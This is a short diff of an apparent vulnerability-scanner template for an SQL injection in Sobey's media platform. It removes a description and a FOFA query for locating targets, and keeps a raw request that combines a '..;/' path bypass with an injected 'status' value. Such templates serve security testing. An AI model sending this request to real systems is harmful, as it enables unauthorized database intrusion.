@@ -3,12 +3,8 @@ info:
   name: 索贝融媒体 articleExamineExport 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bom6gdlz0k6g9v29'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bom6gdlz0k6g9v29
-    fofa: icon_hash="689611853"||app="SOBEY-融媒体" || body="You need to enable JavaScript to run this app" && header="Sobey"
 http:
 - raw:
   - 'GET /sobey-mchEditor/js/..;/mch/Articlelist/articleExamineExport?siteCode=1&status=)''&token=1&createStartTime=&endStartTime= HTTP/1.1
